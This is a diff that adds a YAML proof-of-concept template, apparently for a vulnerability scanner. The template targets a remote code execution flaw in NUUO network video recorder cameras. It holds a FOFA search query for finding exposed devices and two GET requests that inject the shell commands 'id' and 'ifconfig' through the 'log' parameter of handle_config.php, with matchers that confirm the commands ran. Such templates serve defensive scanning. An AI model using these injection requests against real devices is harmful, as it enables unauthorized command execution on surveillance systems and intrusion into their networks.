@@ -1,0 +1,19 @@
+id: poc-yaml-nuuo-camera-handle-config-rce
+info:
+  name: NUUO 摄像机 handle_config 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: nuuo_camera
+  fofa: title="Network Video Recorder Login "
+requests:
+- method: GET
+  path: /handle_config.php?log=;id;
+  expression: status_code == 200 && contains(body,"/mtd") && contains(body,"uid=")
+    && contains(body,"gid=")
+- method: GET
+  path: /handle_config.php?log=;ifconfig;
+  expression: "status_code == 200 && \ncontains(title,\"Debugging Center\") &&\ncontains(body,\"\
+    /mtd\") &&\ncontains(body,\"eth0\") &&\ncontains(body,\"Link encap\")\n"
+variables: {}
+transport: http
